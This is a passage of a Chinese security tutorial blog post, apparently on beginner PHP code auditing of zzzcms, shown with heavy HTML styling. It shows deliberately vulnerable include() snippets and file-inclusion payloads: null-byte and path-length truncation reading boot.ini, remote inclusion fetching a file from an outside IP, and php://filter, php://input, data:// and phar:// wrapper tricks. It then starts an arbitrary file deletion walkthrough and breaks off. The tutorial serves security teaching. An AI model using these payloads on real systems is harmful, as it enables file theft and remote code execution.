rgb(51, 51, 51);">include</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">$filename</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">);</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">?&gt;</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5262154432793136" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/10_Pr3FbADEWXA1uZU84SIxQJvuHrre9g.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIf0bw7zUtdajnJgdEua94XuhJPr3FbADEWXA1uZU84SIxQJvuHrre9g/640?wx_fmt=png'" data-type="png" data-w="1049" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">2.1.2有限制本地包含</h3><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;; height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;Microsoft YaHei&quot;;text-align: start;white-space: normal; "><pre data-lang="" style=" -webkit-tap-highlight-color: transparent;display: grid; counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace; "><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">&lt;?</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">php</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">$filename </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> $_GET</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">[</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'filename'</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">];</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">include</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">$filename</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">".html"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">?&gt;</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">%00截断：条件：magic_quotes_gpc = Off php版本&lt;5.3.4</p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;; height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;Microsoft YaHei&quot;;text-align: start;white-space: normal; "><pre data-lang="" style=" -webkit-tap-highlight-color: transparent;display: grid; counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace; "><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">shell</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">txt</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">html</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">filename=../../../../../../../boot.ini%00 长度截断：条件：windows，点号需要长于256；linux 长于4096</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.36607828089025324" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/11_4eBKsvQp0jlGYCVk5FUJUopBtLnENw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaI0YmibwhOrGemYO8PdsiaXKAtF44eBKsvQp0jlGYCVk5FUJUopBtLnENw/640?wx_fmt=png'" data-type="png" data-w="1303" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">2.1.3远程文件包含</h3><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">allow_url_fopen = On（是否允许打开远程文件） allow_url_include = On（是否允许include/require远程文件）</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.08207934336525308" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/12_jdnHUlEDCd8mAKq8q59JdI41jnQcwg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIyyicTMgQzwhWwmweicWTeRF9KDjdnHUlEDCd8mAKq8q59JdI41jnQcwg/640?wx_fmt=png'" data-type="png" data-w="731" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">无限制远程包含 有限制远程包含</p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;; height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;Microsoft YaHei&quot;;text-align: start;white-space: normal; "><pre data-lang="" style=" -webkit-tap-highlight-color: transparent;display: grid; counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace; "><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">&lt;?</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">php include</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">$_GET</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">[</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'filename'</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">]</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">".html"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">);</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">?&gt;</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">filename</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">http</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);">//127.0.0.1/1/include.php?filename=http://49.235.54.135/wp-content/uploads/2020/04/2-7-180x100.png?</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">filename</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">http</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);">//127.0.0.1/1/include.php?filename=http://49.235.54.135/wp-content/uploads/2020/04/2-7-180x100.png%23</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">filename</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">http</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);">//127.0.0.1/1/include.php?filename=http://49.235.54.135/wp-content/uploads/2020/04/2-7-180x100.png%20</span></span></code></pre></section><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">2.1.4伪协议包含</h3><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">https://www.cnblogs.com/endust/p/11804767.html</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">php://filter php://input</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">Payload：?filename=php://filter/convert.base64-encode/resource=index.txt ?filename=php://input post ');?&gt;</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5555555555555556" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/13_7WFVolVicZZ1cj0opnsKlDhQur1oqw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIHhKKMkY8anuycRpVU15Eu5rfC7WFVolVicZZ1cj0opnsKlDhQur1oqw/640?wx_fmt=png'" data-type="png" data-w="828" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.43172179813401185" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/14_lkUN9QIZBKwqxicVyCEq3zuNKom2Vg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIbic5ZViaE2NvhMyMjOIJjZPzhpKlkUN9QIZBKwqxicVyCEq3zuNKom2Vg/640?wx_fmt=png'" data-type="png" data-w="1179" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">file:// data:// pchar:// zip://</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.30185497470489037" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/15_EwtDo9lmwicgIuEATqLxTicUW2h3sA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIpkeXvXVXAgiadurAlmBxyCuTqJhEwtDo9lmwicgIuEATqLxTicUW2h3sA/640?wx_fmt=png'" data-type="png" data-w="593" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.34097421203438394" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/16_Phic7TNJJz0eobGBt4McSiaZ8YWyGw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIdviaOyiaFc9VbXZ65Dojce3TKHVsPhic7TNJJz0eobGBt4McSiaZ8YWyGw/640?wx_fmt=png'" data-type="png" data-w="1047" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">最后一个pchar是利用一个压缩包，里面存放为index.txt文件 ?filename=file:///D:/phpstudy/PHPTutorial/WWW/index.txt ?filename=data://text/plain,&nbsp;?filename=phar://index.zip/index.txt</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">###2.2 index.php 继续回到zzzcms可以看到index.php有很明显的文件包含漏洞因为这里是可控的，但是截断前提还是低版本</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.3543647363872083" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/17_rSMYjc8txcxZaEU5vbAPy20WDQgkHw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIElWaViajjTy7LypknfuufC2jDrSMYjc8txcxZaEU5vbAPy20WDQgkHw/640?wx_fmt=png'" data-type="png" data-w="1157" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5365638766519824" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/18_XS6JgKNw4HrJzKxdSIfUoSZLAibiaQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIzfAiaYHOWGGGG5Blt2U4qHArlVKXS6JgKNw4HrJzKxdSIfUoSZLAibiaQ/640?wx_fmt=png'" data-type="png" data-w="1135" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">#0x03 任意文件删除 这里我们来看看zzzphp</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">这里来到后台随便找个删除按钮抓包</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.517948717948718" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/19_agP9T56DLf1gp7jl3zAriatDkiaQEA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIF7KMIn5ZicatlgPmSKpcribCqQBUagP9T56DLf1gp7jl3zAriatDkiaQEA/640?wx_fmt=png'" data-type="png" data-w="780" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">可以看到这里是请求了save.php act参数为delfile,我们来跟进看一下</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5619335347432024" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/20_L9Jic1sUEaoKiaUqhZq3uKd89h0R4g.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIAkkxiauicpOLGFTllvyMAhZ2HI39L9Jic1sUEaoKiaUqhZq3uKd89h0R4g/640?wx_fmt=png'" data-type="png" data-w="662" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">可以看到返回了delfile()函数，跟进一下</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.30965391621129323" 